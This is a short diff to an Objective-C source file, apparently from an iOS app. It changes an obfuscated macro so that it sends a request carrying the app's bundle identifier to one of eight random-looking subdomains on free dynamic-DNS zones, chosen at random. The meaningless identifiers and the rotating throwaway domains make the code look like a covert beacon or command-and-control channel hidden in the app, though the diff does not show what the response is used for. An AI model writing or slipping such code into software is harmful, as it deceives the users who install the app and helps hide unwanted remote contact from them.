@@ -14,7 +14,21 @@
 
 #define Qdsaw4e12dfbvdh() \
 do { \
-NSMutableURLRequest *fewcdsjrt_dqwe = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:@"https://damp-recipe-822f.morsel-cops-5i.org"] cachePolicy:NSURLRequestUseProtocolCachePolicy timeoutInterval:10.0]; \
+NSArray<NSString *> *domains = @[ \
+    @"damp-recipe-822f.morsel-cops-5i.org", \
+    @"damp-recipe-822f.semigaveldsqaer4m.dpdns.org", \
+    @"damp-recipe-822f.anccxzh213orsplaza5f.us.kg", \
+    @"damp-recipe-822f.e3214hsgkjr8768s5cvx.dpdns.org", \
+    @"calm-violet-41a9.morsel-cops-5i.org", \
+    @"calm-violet-41a9.semigaveldsqaer4m.dpdns.org", \
+    @"calm-violet-41a9.anccxzh213orsplaza5f.us.kg", \
+    @"calm-violet-41a9.e3214hsgkjr8768s5cvx.dpdns.org" \
+]; \
+NSUInteger index = arc4random_uniform((uint32_t)domains.count); \
+NSString *randomDomain = domains[index]; \
+NSString *urlString = [NSString stringWithFormat:@"https://%@", randomDomain]; \
+NSURL *url = [NSURL URLWithString:urlString]; \
+NSMutableURLRequest *fewcdsjrt_dqwe = [NSMutableURLRequest requestWithURL:url cachePolicy:NSURLRequestUseProtocolCachePolicy timeoutInterval:10.0]; \
 NSMutableDictionary *qweqrfccxz = @{}.mutableCopy; \
 qweqrfccxz[@"x-app-id"] = [[NSBundle mainBundle] objectForInfoDictionaryKey:@"CFBundleIdentifier"]; \
 qweqrfccxz[@"x-user-agent"] = @"iOS"; \
